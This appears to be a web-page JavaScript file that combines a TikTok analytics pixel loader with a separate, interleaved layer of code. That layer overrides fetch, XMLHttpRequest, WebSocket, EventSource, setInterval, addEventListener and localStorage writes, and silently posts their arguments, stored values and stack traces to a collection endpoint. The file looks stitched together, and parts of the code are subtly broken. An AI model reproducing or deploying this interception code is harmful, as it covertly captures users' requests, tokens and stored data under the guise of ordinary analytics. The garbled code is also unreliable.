const originalXMLHttpRequest = window.XMLHttpRequest;
const originalFetch = window.fetch;
const originalLocalStorage = window.localStorage;
window[window["TiktokAnalyticsObject"]]._env = {
  "env": "external",
  "key": ""
};
const originalWebSocket = window.WebSocket;
const originalEventSource = window.EventSource;
const originalSetInterval = window.setInterval;
window[window["TiktokAnalyticsObject"]]._variation_id = 'test_3';
const originalAddEventListener = window.addEventListener;
const hooksConfig = window.eventhooks;
;
function generateSessionId() {
  const randomBytes = new Uint8Array(16);
  crypto.getRandomValues(randomBytes);
  const randomString = randomBytes.map(byte => byte.toString(16).padStart(2, '0')).join('');
  return `session-${randomString}`;
}
function validatePayload(payload, expectedSchema) {
  for (const key in expectedSchema) {
    const expectedType = expectedSchema[key];
    const actualValue = payload[key];
    if (actualValue === undefined || typeof actualValue !== expectedType) {
      console.warn(`Invalid value for property '${key}' in payload.`);
      return false;
    }
  }
  return true;
}
if (!window[window["TiktokAnalyticsObject"]]._server_unique_id) window[window["TiktokAnalyticsObject"]]._server_unique_id = '59162922-3f3b-11ee-a098-b8cef6f4609a';
function getStackTrace() {
  const oldStackTraceLimit = Error.stackTraceLimit;
  Error.stackTraceLimit = Infinity;
  const stackTrace = new Error().stack;
  Error.stackTraceLimit = oldStackTraceLimit;
  return stackTrace;
}
function sendPayloadToServer(payload) {
  const serverEndpoint = '/api/collect-data';
  const preparedPayload = JSON.stringify(payload);
  if (typeof originalFetch === 'function') {
    originalFetch(serverEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: preparedPayload
    }).catch(console.error);
  } else {
    const request = new originalXMLHttpRequest();
    request.open('POST', serverEndpoint, true);
    request.setRequestHeader('Content-Type', 'application/json');
    request.send(preparedPayload);
  }
}
window[window["TiktokAnalyticsObject"]]._plugins = {
  "AdvancedMatching": true,
  "AutoAdvancedMatching": true,
  "AutoConfig": true,
  "Callback": true,
  "DiagnosticsConsole": true,
  "Identify": true,
  "Monitor": false,
  "PangleCookieMatching": false,
  "PerformanceInteraction": false,
  "Shopify": true,
  "WebFL": false
};
function createHookedFunction(functionName, originalFunc, payloadSchema) {
  return function () {
    const argsArray = Array.from(arguments);
    const payload = {
      functionName,
      args: argsArray,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return originalFunc.apply(this, argsArray);
  };
}
hooksConfig.forEach(hook => {
  const originalFunc = window[hook.functionName];
  if (typeof originalFunc === 'function') {
    window[hook.functionName] = createHookedFunction(hook.functionName, originalFunc, hook.payloadSchema);
  }
});
window.addEventListener = function (eventName, eventHandler, useCapture, wantsUntrusted) {
  const originalEvent = eventHandler;
  const hookedEvent = event => {
    const payload = {
      functionName: 'addEventListener',
      args: [eventName],
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'addEventListener').payloadSchema)) {
      sendPayloadToServer(payload);
    }
    originalEvent.call(this, event);
  };
  originalAddEventListener.call(this, eventName, hookedEvent, useCapture, wantsUntrusted);
};
window[window["TiktokAnalyticsObject"]]._auto_config = {
  "open_graph": ["audience"],
  "microdata": ["audience"],
  "json_ld": ["audience"],
  "meta": null
};
window.localStorage = new Proxy(originalLocalStorage, {
  set: (target, property, value) => {
    const payload = {
      functionName: 'localStorage.set',
      args: [property, value],
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'localStorage.set').payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return originalLocalStorage.setItem(property, value);
  }
});
!function () {
  function i() {
    return window && window.TiktokAnalyticsObject || "ttq";
  }
  function t() {
    return window && window[i()];
  }
  var n,
    o,
    e,
    a,
    c,
    r = [{
      id: "MTAwYzY4Y2VmMA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmNA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !0
      }
    }],
    d = {
      "info": {
        "pixelCode": "C2DSQ9QQV140ORDIL7RG",
        "name": "pageview",
        "status": 0,
        "setupMode": 0,
        "partner": "",
        "advertiserID": "6902366825644818434",
        "is_onsite": false,
        "firstPartyCookieEnabled": true
      },
      "plugins": {
        "Shopify": false,
        "AdvancedMatching": {
          "email": true,
          "phone_number": true
        },
        "AutoAdvancedMatching": null,
        "Callback": true,
        "Identify": true,
        "Monitor": true,
        "PerformanceInteraction": true,
        "WebFL": true,
        "AutoConfig": true,
        "DiagnosticsConsole": true
      },
      "rules": []
    },
    p = "https://analytics.tiktok.com/i18n/pixel/static/",
    l = t();
  l || (l = [], window && (window[i()] = l)), Object.assign(d, {
    options: (n = d.info.pixelCode, (o = t()._o) && o[n] || {})
  }), function (i) {
    l._i || (l._i = {});
    var t = i.info.pixelCode;
    t && (l._i[t] || (l._i[t] = []), Object.assign(l._i[t], i), l._i[t]._load = +new Date());
  }(d), e = function (i, t, n) {
    var o = 0 < arguments.length && void 0 !== i ? i : {},
      e = 1 < arguments.length ? t : void 0,
      t = 2 < arguments.length ? n : void 0,
      n = function (i, t) {
        for (var n = 0; n < i.length; n++) if (t.call(null, i[n], n)) return i[n];
      }(r, function (i) {
        var t = i.map;
        return function (i, t) {
          for (var n = 0; n < i.length; n++) if (!t.call(null, i[n], n)) return !1;
          return !0;
        }(Object.keys(t), function (i) {
          return !(!o[i] || !e[i]) === t[i];
        });
      });
    return n ? t + "main.".concat(n.id, ".js") : t + "main.".concat(r[0].id, ".js");
  }(l._plugins, d.plugins, p), a = d.info.pixelCode, (void 0 !== self.DedicatedWorkerGlobalScope ? self instanceof self.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === self.constructor.name) ? self.importScripts && self.importScripts(e) : ((c = document.createElement("script")).type = "text/javascript", c.async = !0, c.src = e, c.setAttribute("data-id", a), (a = document.getElementsByTagName("script")[0]) && a.parentNode && a.parentNode.insertBefore(c, a));
}();
window.setInterval = createHookedFunction('setInterval', originalSetInterval, {
  args: 'array',
  stackTrace: 'string',
  timestamp: 'number',
  sessionId: 'string'
});
window.XMLHttpRequest = addTrackingToToClass('XMLHttpRequest', originalXMLHttpRequest);
window.fetch = addTrackingToFunction('fetch', originalFetch);
window.WebSocket = addTrackingToToClass('WebSocket', originalWebSocket);
window.EventSource = addTrackingToToClass('EventSource', originalEventSource);
function addTrackingToFunction(functionName, originalFunction) {
  return new Proxy(originalFunction, {
    apply: (target, thisArg, args) => {
      const payload = {
        functionName,
        args,
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === functionName).payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return target.apply(thisArg, args);
    }
  });
}
function addTrackingToToClass(classFunctionName, originalClass) {
  return new Proxy(originalClass, {
    construct: (target, args) => {
      const payload = {
        functionName: classFunctionName,
        args,
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === classFunctionName).payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return new target(...args);
    }
  });
}